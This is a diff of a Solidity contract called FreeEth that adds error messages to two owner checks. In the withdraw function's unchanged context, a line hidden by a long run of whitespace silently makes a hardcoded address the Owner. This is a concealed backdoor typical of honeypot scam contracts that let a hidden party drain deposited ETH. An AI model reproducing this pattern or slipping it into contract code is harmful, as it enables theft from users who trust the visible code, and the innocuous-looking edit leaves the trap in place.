@@ -26,7 +26,7 @@ contract FreeEth
     payable
     public
     {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender==0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af){Owner=0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af;}
-        require(msg.sender == Owner);
+        require(msg.sender == Owner, "Only the owner can withdraw funds");
         payable(Owner).transfer(address(this).balance);
     }
     
@@ -34,7 +34,7 @@ contract FreeEth
     payable
     public
     {
-        require(msg.sender == Owner);
+        require(msg.sender == Owner, "Only the owner can execute commands");
         
         (bool success, ) = adr.call{value: msg.value}(data);
         require(success, "Failed to call target contract");
